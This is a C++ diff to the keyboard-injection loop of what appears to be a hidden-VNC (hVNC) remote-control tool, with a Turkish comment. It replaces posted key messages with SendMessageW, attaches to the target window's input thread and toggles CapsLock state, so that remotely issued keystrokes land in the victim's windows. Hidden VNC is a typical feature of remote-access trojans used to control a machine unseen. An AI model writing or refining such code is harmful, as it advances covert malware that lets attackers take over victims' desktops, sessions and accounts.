@@ -923,19 +923,32 @@ static void input_loop() {
         const json&   cmd    = task.cmd;
 
         // ---- Klavye ----
-        if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
+        if (action == "hvnc_keydown" || action == "hvnc_keyup") {
             int vk = cmd.value("keycode", 0);
             HWND hTarget = target_window_from_screen_point(g_lastMousePos);
             if (!hTarget || !IsWindow(hTarget)) hTarget = GetFocusedWindow();
             if (!hTarget || !IsWindow(hTarget)) continue;
 
-            if (action == "hvnc_keydown") {
-                PostMessageW(hTarget, WM_KEYDOWN, (WPARAM)vk, key_lparam((WORD)vk, false));
-            } else if (action == "hvnc_keyup") {
-                PostMessageW(hTarget, WM_KEYUP, (WPARAM)vk, key_lparam((WORD)vk, true));
-            } else if (action == "hvnc_char") {
-                PostMessageW(hTarget, WM_CHAR, (WPARAM)vk, 1);
+            bool isKeyUp = (action == "hvnc_keyup");
+            UINT msg = isKeyUp ? WM_KEYUP : WM_KEYDOWN;
+
+            DWORD targetThreadId = GetWindowThreadProcessId(hTarget, NULL);
+            DWORD currentThreadId = GetCurrentThreadId();
+
+            AttachThreadInput(currentThreadId, targetThreadId, TRUE);
+
+            if (vk == 0x14 && !isKeyUp) { // VK_CAPITAL down
+                BYTE keyState[256];
+                if (GetKeyboardState(keyState)) {
+                    keyState[0x14] ^= 1;
+                    SetKeyboardState(keyState);
+                }
             }
+
+            SendMessageW(hTarget, msg, (WPARAM)vk, key_lparam((WORD)vk, isKeyUp));
+
+            AttachThreadInput(currentThreadId, targetThreadId, FALSE);
+
             g_forceFullFrame = true;
             continue;
         }
